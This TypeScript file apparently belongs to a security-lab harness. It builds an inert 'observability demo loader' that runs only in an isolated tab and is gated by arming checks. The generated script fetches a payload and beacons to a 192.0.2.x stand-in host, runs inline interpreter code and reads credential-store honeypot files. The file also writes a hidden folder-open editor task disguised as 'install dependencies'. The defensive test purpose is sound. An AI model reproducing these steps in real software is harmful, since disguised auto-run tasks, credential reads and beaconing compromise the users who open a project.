// The observability demo loader, assembled in memory from fixtures/loader-workspace/.seclab/
// loader.parts.json and written inside the tab only (into the tab user's home). No host file
// ever holds the assembled loader or the hidden folder-open task: endpoint AV quarantines
// loader-shaped files (EDR fixture-safety, addendum). Inert unless armed: see the arming
// checks below, which match the original fixture's contract.

import * as fs from 'node:fs';
import * as path from 'node:path';

interface Parts {
	fetchTool: string[]; interpreter: string[]; inline: string[]; rehInterpreter: string[];
	beaconHost: string; honeypots: string[][]; beacons: number; intervalSeconds: number;
}

const PARTS = path.join(import.meta.dirname, 'fixtures', 'loader-workspace', '.seclab', 'loader.parts.json');
/** Where the loader lives in the tab, relative to the tab user's home (tab-private under both drivers). */
export const LOADER_IN_TAB = '.cache/seclab-obs/loader.sh';
/** The folder-open task's command, run with the workspace as its working directory. */
export const TASK_COMMAND = `sh "$HOME/${LOADER_IN_TAB}"`;

function parts(): Parts {
	const p = JSON.parse(fs.readFileSync(PARTS, 'utf8')) as Parts;
	const safe = /^[A-Za-z0-9 ./_()-]+$/;
	const all = [...p.fetchTool, ...p.interpreter, ...p.inline, ...p.rehInterpreter, p.beaconHost, ...p.honeypots.flat()];
	if (!all.every(s => typeof s === 'string' && safe.test(s)) || !/^192\.0\.2\.\d{1,3}$/.test(p.beaconHost)
		|| !Number.isInteger(p.beacons) || p.beacons < 1 || p.beacons > 10 || !(p.intervalSeconds > 0 && p.intervalSeconds <= 5)) {
		throw new Error(`${PARTS}: unexpected parts`);
	}
	return p;
}

/** Honeypot paths the loader reads, relative to the tab user's home. */
export function honeypots(): string[] {
	return parts().honeypots.map(h => h.join(''));
}

/** The loader script text. Only ever held in memory and piped into the tab. */
export function loaderScript(): string {
	const p = parts();
	const fetch = p.fetchTool.join('');
	const url = (what: string) => `http://${p.beaconHost}/${what}`;
	const reads = honeypots().map(h => `"$HOME/${h}"`).join(' ');
	return [
		'#!/bin/sh',
		'# Inert observability demo loader, assembled from loader.parts.json and written in the tab only.',
		'HERE="$(pwd)"',
		'TARGETS="$HERE/.seclab/targets"',
		'get() { sed -n "s/^$1=//p" "$TARGETS" 2>/dev/null | head -1; }',
		'ARM="$(get arm)"; RUN="$(get run)"; UNTIL="$(get until)"; MARKER="$(get marker)"',
		'printf \'%s\' "$ARM" | grep -qE \'^[0-9a-f]{32}$\' || exit 0',
		'case "$RUN" in /?*) ;; *) exit 0 ;; esac',
		'case "$HERE/" in "$RUN"/*) ;; *) exit 0 ;; esac',
		'case "$UNTIL" in \'\'|*[!0-9]*) exit 0 ;; esac',
		'[ "$(date +%s)" -lt "$UNTIL" ] || exit 0',
		'case "$MARKER" in *\'/..\'*|*\'../\'*) exit 0 ;; "$HERE"/.envrc) ;; *) exit 0 ;; esac',
		// 1. Detach, fetch a "payload" (goes nowhere), evaluate inline code.
		`I="$(command -v ${p.interpreter.join('')} || echo ${p.rehInterpreter.join('')})"`,
		`nohup sh -c "${fetch} --noproxy '*' -s -m 1 -o /dev/null ${url('payload')}; $I -e '${p.inline.join('')}'" >/dev/null 2>&1 &`,
		// 2. Credential-store honeypots in the tab.
		`for f in ${reads}; do cat "$f" >/dev/null 2>&1; done`,
		// 3. Drop a host-executable file (the run's single marker).
		'printf \'# seclab observability marker %s\\n\' "$ARM" > "$MARKER"',
		'chmod +x "$MARKER"',
		// 4. Beacon at a regular interval.
		'i=0',
		`while [ "$i" -lt ${p.beacons} ]; do`,
		`\t${fetch} --noproxy "*" -s -m 1 -o /dev/null ${url('beacon')}`,
		`\ti=$((i + 1)); sleep ${p.intervalSeconds}`,
		'done',
		'wait',
		'',
	].join('\n');
}

/** The hidden folder-open task (demo only), written into the tab's workspace inside the tab. */
export function folderOpenTasks(): string {
	return JSON.stringify({
		version: '2.0.0',
		tasks: [{ label: 'install dependencies', type: 'shell', command: TASK_COMMAND, runOptions: { runOn: 'folderOpen' }, presentation: { reveal: 'never' }, problemMatcher: [] }],
	}, null, '\t') + '\n';
}

/** Shell that writes stdin to `dest` (a path expression the tab's shell expands), creating its directory. */
export function writeStdinTo(dest: string): string {
	return `set -e; d=${dest}; mkdir -p "$(dirname "$d")"; cat > "$d"; chmod 0755 "$d"`;
}
